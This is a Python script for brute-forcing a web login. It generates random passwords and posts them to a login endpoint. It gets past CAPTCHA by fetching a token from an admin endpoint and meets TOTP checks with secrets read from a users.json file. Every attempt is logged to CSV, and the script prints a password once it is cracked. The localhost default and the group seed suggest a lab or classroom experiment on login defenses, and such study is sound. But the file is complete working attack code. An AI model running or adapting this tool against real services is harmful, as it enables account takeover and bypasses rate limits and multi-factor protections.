import requests
import string
import time
import os
import json
import random
import argparse
import pyotp
import csv
from datetime import datetime
import secrets

# ======================================
# CONFIGURATION
# ======================================
GROUP_SEED = 6631928
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

try:
    with open("users.json", "r") as f:
        USER_DATA = {u["username"]: u for u in json.load(f)}
except FileNotFoundError:
    print("[!] Error: users.json not found.")
    exit(1)


# ======================================
# HELPER FUNCTIONS
# ======================================

def get_captcha_token(base_url, session):
    """Obtains CAPTCHA token."""
    try:
        admin_url = base_url.replace("/login", "/admin/get_captcha_token")
        r = session.get(admin_url, params={"group_seed": GROUP_SEED})
        if r.status_code == 200:
            return r.json().get("captcha_token")
    except Exception:
        pass
    return None


def generate_totp(username, clock_drift=0):
    """Generate TOTP code with drift."""
    user = USER_DATA.get(username)
    if user and user.get("totp_secret"):
        totp = pyotp.TOTP(user["totp_secret"])
        return totp.at(time.time() + clock_drift)
    return None


def generate_random_password(category):
    """Password generator for brute-force attempts."""
    if category == "weak":
        length = secrets.randbelow(3) + 4
        chars = string.ascii_lowercase + string.digits
    elif category == "medium":
        length = secrets.randbelow(4) + 7
        chars = string.ascii_letters + string.digits
    elif category == "strong":
        length = secrets.randbelow(6) + 11
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
    else:
        length = 8
        chars = string.ascii_letters
    return ''.join(secrets.choice(chars) for _ in range(length))


# ======================================
# ATTACK LOGIC
# ======================================

def run_attack(target_url, username, category, max_attempts, output_file, use_bypass, clock_drift):
    print(f"[*] Starting brute-force on {username}")
    print(f"[*] Bypass Enabled: {use_bypass}")
    print(f"[*] Clock Drift: {clock_drift}")

    session = requests.Session()

    with open(output_file, "w", newline="") as csvfile:
        fieldnames = ["timestamp", "attempt_number", "username", "password", "status", "latency_ms", "notes"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()

        sync_done = False

        for attempt in range(1, max_attempts + 1):
            password = generate_random_password(category)

            payload = {"username": username, "password": password}

            # Initial login attempt
            req_start = time.time()
            try:
                r = session.post(target_url, json=payload)
                latency = (time.time() - req_start) * 1000
                resp = r.json()
                status_code = r.status_code
            except Exception:
                break

            notes = ""
            total_latency = latency

            # CAPTCHA
            if status_code == 403 and resp.get("captcha_required"):
                if use_bypass:
                    notes += "captcha_bypass;"
                    token = get_captcha_token(target_url, session)
                    if token:
                        payload["captcha_token"] = token
                        retry_start = time.time()
                        r = session.post(target_url, json=payload)
                        total_latency += (time.time() - retry_start) * 1000
                        resp = r.json()
                        status_code = r.status_code
                else:
                    notes += "captcha_block;"

            # TOTP
            if status_code == 401 and "totp" in str(resp.get("reason", "")):
                notes += "totp_required;"
                code = generate_totp(username, clock_drift)
                payload["totp_code"] = code

                retry = session.post(target_url, json=payload)
                status_code = retry.status_code
                if status_code == 200:
                    notes += "totp_success;"
                else:
                    notes += "totp_failed;"

            # Classification
            result = "fail"
            if status_code == 200:
                result = "success"
            elif status_code == 429:
                result = "rate_limited"
            elif status_code == 423:
                result = "locked_out"

            writer.writerow({
                "timestamp": datetime.now().isoformat(),
                "attempt_number": attempt,
                "username": username,
                "password": password,
                "status": result,
                "latency_ms": round(total_latency, 2),
                "notes": notes
            })

            if attempt % 200 == 0:
                print(f"[{attempt}] Status: {result}")

            if result == "success":
                print(f"[!!!] CRACKED: {password}")
                break

    print("[*] Attack completed.")


# ======================================
# MAIN
# ======================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:5000/login")
    parser.add_argument("--username", required=True)
    parser.add_argument("--category", required=True)
    parser.add_argument("--attempts", type=int, default=20000)
    parser.add_argument("--tag", default="experiment")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--drift", type=int, default=0)

    args = parser.parse_args()

    filename = f"{LOG_DIR}/bruteforce_{args.username}_{args.tag}.csv"

    run_attack(
        args.url,
        args.username,
        args.category,
        args.attempts,
        filename,
        not args.no_bypass,
        args.drift
    )
